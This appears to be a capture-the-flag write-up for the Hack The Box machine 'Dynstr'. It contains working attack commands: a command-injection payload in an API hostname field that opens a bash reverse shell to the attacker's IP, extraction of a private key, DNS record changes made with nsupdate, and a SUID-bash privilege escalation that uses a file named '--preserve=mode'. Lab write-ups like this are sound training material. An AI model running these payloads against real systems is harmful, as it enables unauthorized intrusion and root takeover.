# [dynstr](https://app.hackthebox.com/machines/Dynstr)


```bash
nmap -p- --min-rate 10000 10.10.10.244 -Pn  
```

![Alt text](img/image.png)

After identifying open ports (22,53,80), we can do greater nmap scan.

```bash
nmap -A -sC -sV -p22,53,80 10.10.10.244 -Pn 
```

![Alt text](img/image-1.png)

Directory enumeration.

```bash
gobuster dir -u http://10.10.10.244/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 
```

![Alt text](img/image-2.png)

I found '/nic' endpoint, let's brute-force also this endpoint.

```bash
gobuster dir -u http://10.10.10.244/nic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 
```

![Alt text](img/image-3.png)

If we browse the '/nic/update', it looks like API.

![Alt text](img/image-4.png)


I just find API [Documentation](https://www.noip.com/integrate/request) via no ip address included.


dynadns:sndanyd credentials are defualt ones for this API.

And `hostname` field is vulnerable on this API.

As because.

```bash
curl -G --data-urlencode 'hostname=d.r.4.k.s' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
```

![Alt text](img/image-5.png)

Let's inject our reverse shell payload into this parameter.

But, we need to show our IP Address in another format.

![Alt text](img/image-6.png)

```bash
curl -G --data-urlencode 'hostname=$(/bin/bash -c "bash -i >& /dev/tcp/168431619/1337 0>&1").no-ip.htb' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
```

![Alt text](img/image-7.png)


I got reverse shell from port (1337).

![Alt text](img/image-8.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-9.png)


After enumeration, I find private key (id_rsa) from this file called 'strace-C62796521.txt' which located on '/home/bindmgr/support-case-C62796521'.

![Alt text](img/image-10.png)

I read just id_rsa.

```bash
grep BEGIN strace-C62796521.txt | cut -d'"' -f2 | sed 's/\\n/\'$'\n''/g'
```


I just grab this id_rsa file to login into 'bindmgr' account, but it doesn't work.

![Alt text](img/image-11.png)


As because, we need to add our public key into machine. For this, we need to update **nameserver**.

```bash
nsupdate -k /etc/bind/infra.key
server 127.0.0.1
zone dyna.htb
update add dr4ks.infra.dyna.htb 30 IN A 10.10.16.3
send
zone 10.in-addr.arpa
update add 3.16.10.10.in-addr.arpa 30 IN PTR dr4ks.infra.dyna.htb
send
```


![Alt text](img/image-12.png)

After this, we can successfully login into machine.

```bash
ssh -i id_rsa bindmgr@10.10.10.244
```

user.txt

![Alt text](img/image-13.png)


For privilege escalation, I just enumerate user via `sudo -l` command.

![Alt text](img/image-14.png)

This file has a script like below.

![Alt text](img/image-15.png)

The script was looking for a file named, “.version” with version number. So, I created a file in /dev/shm directory

![Alt text](img/image-16.png)

Then copied the /bin/bash into current directory gave the bash binary SUID bit and preserved the mode
```bash
cp /bin/bash .
chmod +s bash
echo > --preserve=mode
```

After execution of script via `sudo /usr/local/bin/bindmgr.sh`, I see that '/bin/bash' binary has **root** privilege.

![Alt text](img/image-17.png)

And runs this binary via `-p` option to get root shell (/etc/bind/named.bindmgr/bash).

root.txt

![Alt text](img/image-18.png)

